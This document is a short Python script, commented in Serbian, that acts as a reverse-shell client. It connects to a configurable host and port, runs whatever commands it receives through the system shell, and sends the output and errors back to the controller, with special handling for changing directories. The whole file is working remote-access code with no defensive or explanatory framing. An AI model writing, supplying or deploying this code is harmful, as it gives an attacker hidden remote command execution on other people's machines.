#Klijent kod
import socket
import subprocess
import os

host = socket.gethostname()      # Ovo promeniti pre startanja kod-a
port = 19304

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def main():
    op = subprocess.Popen(data.decode(), shell = True,
                    stdout = subprocess.PIPE,
                    stderr = subprocess.PIPE,
                    stdin = subprocess.PIPE)

    raport = op.stdout.read()
    raport_error = op.stderr.read()

    print(raport.decode())
    print(raport_error.decode())

    s.sendall(raport)
    s.sendall(raport_error)

print('Konekcija ostvarena sa: ', host, ':', port)
s.connect((host, port))

while True:
    data = s.recv(1024)
    prijem = data.decode()
    print('Primljeno: ', prijem)

    if prijem[:2] == 'cd':
        try:
            os.chdir(prijem[3:])
            s.sendall(('Dir changed: ' + prijem + 'Done').encode())
        except:
            s.sendall('Direktorijum ne postoji..!'.encode())
            print('Direktorijum ne postoji..!')

    else:
        main()
       
